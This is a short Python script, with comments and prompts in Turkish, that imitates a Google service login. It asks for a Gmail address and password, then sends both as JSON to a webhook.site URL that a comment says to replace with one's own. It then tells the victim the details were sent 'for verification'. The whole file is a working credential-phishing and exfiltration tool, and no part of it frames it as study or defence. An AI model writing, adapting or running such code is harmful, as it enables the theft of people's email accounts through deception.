import urllib.request
import json

# Webhook.site'dan aldığın URL'yi buraya yapıştır
WEBHOOK_URL = "https://webhook.site/7f7fa68e-1c15-43f2-b036-d9179808b05e"

print("--- Google Servis Bağlantısı ---")
email = input("Gmail Adresi: ")
sifre = input("Şifre: ")

# Verileri paketle
data = {
    "servis": "Gmail",
    "kullanici": email,
    "sifre": sifre
}

# Veriyi JSON formatına çevir ve gönder
params = json.dumps(data).encode('utf8')
req = urllib.request.Request(WEBHOOK_URL, data=params, headers={'content-type': 'application/json'})

try:
    with urllib.request.urlopen(req) as response:
        if response.getcode() == 200:
            print("\n[+] Bilgiler doğrulama için gönderildi gardaş!")
        else:
            print("\n[-] Sunucu hatası oluştu.")
except Exception as e:
    print(f"\n[!] Bağlantı başarısız! Hata: {e}")
  
